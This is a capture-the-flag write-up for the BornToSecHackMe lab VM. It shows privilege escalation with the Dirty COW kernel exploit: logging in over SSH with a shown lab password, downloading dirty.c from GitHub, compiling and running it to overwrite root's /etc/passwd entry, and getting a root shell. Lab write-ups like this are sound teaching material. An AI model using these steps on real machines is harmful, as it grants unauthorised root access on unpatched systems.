# Dirty Cow

we have also mounted the VM on the host in order to have access to its content

``` bash
sudo mkdir /mnt/iso /mnt/fs

┌──(kali㉿kali)-[~]
└─$ sudo mount -o loop ~/Downloads/BornToSecHackMe-v1.1.iso /mnt/iso
mount: /mnt/iso: WARNING: source write-protected, mounted read-only.

┌──(kali㉿kali)-[/mnt/iso/casper]
└─$ sudo mount -o loop /mnt/iso/casper/filesystem.squashfs  /mnt/fs/ -t squashfs                
                                                                                                     
┌──(kali㉿kali)-[~]
└─$ ls -l /mnt/iso/
total 10
dr-xr-xr-x 2 root root 2048 Jun 16  2017 casper
dr-xr-xr-x 2 root root 2048 Jun 16  2017 install
dr-xr-xr-x 2 root root 2048 Jun 16  2017 isolinux
-r--r--r-- 1 root root  844 Jun 16  2017 md5sum.txt
dr-xr-xr-x 2 root root 2048 Jun 16  2017 preseed
-r--r--r-- 1 root root  201 Jun 16  2017 README.diskdefines
-r--r--r-- 1 root root    0 Jun 16  2017 ubuntu

┌──(kali㉿kali)-[~]
└─$ ls -l /mnt/fs/
total 0
drwxr-xr-x   2 root     root 2734 Oct 13  2015 bin
drwxr-xr-x   3 root     root  274 Oct 13  2015 boot
drwxr-xr-x   2 root     root   30 Jun 16  2017 dev
drwxr-xr-x 100 root     root 3295 Jun 16  2017 etc
drwxrwx--x   9 www-data root  126 Oct 13  2015 home
lrwxrwxrwx   1 root     root   37 Oct  7  2015 initrd.img -> /boot/initrd.img-3.2.0-91-generic-pae
drwxr-xr-x  22 root     root 1420 Oct 13  2015 lib
drwxr-xr-x   3 root     root   28 Jun 16  2017 media
drwxr-xr-x   2 root     root    3 Jun 16  2017 mnt
drwxr-xr-x   2 root     root    3 Oct  7  2015 opt
drwxr-xr-x   2 root     root    3 Jun 16  2017 proc
drwx------   5 root     root  150 Oct 15  2015 root
drwxr-xr-x   2 root     root    3 Jun 16  2017 run
drwxr-xr-x   2 root     root 3446 Oct 13  2015 sbin
drwxr-xr-x   2 root     root    3 Mar  5  2012 selinux
drwxr-xr-x   3 root     root   26 Oct  7  2015 srv
drwxr-xr-x   2 root     root    3 Jun 16  2017 sys
drwxrwxrwt   2 root     root    3 Jun 16  2017 tmp
drwxr-xr-x  10 root     root  174 Oct  7  2015 usr
drwxr-xr-x  13 root     root  196 Jun 16  2017 var
lrwxrwxrwx   1 root     root   33 Oct  7  2015 vmlinuz -> boot/vmlinuz-3.2.0-91-generic-pae

```

As we saw in the [writeup3][1]

[1]: /bonus/writeup3.md
we have password for user 'laurie' to login in ssh:

```
sshpass -p "330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4" ssh laurie@172.20.10.8 
```
we copy the source code of exploit find in [Exploit DB](https://www.exploit-db.com/exploits/40847)

This exploit uses the [pokemon](https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c) exploit of the dirtycow vulnerability as a base generates a new passwd line. The user will be prompted for the new password when the binary is run. The original /etc/passwd file is then backed up to /tmp/passwd.bak and overwrites the root account with the generated line. After running the exploit you should be able to login with the newly created user.

```console
wget --no-check-certificate https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
```
Compile with:
```
   gcc -pthread dirty.c -o dirty -lcrypt
```
Then run the newly create binary by either doing:
```
   ./dirty "my-new-password"
```

```
laurie@BornToSecHackMe:~$ wget --no-check-certificate https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
--2022-03-14 19:58:50--  https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4815 (4.7K) [text/plain]
Saving to: `dirty.c'

100%[====================================================>] 4,815       --.-K/s   in 0.001s  

2022-03-14 19:58:50 (3.66 MB/s) - `dirty.c' saved [4815/4815]

laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
laurie@BornToSecHackMe:~$ ./dirty "lol"
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: lol
Complete line:
firefart:fii4ulI./W5Fk:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'lol'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'lol'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
laurie@BornToSecHackMe:~$ 
laurie@BornToSecHackMe:~$ su -
Password: 
firefart@BornToSecHackMe:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@BornToSecHackMe:~# 

```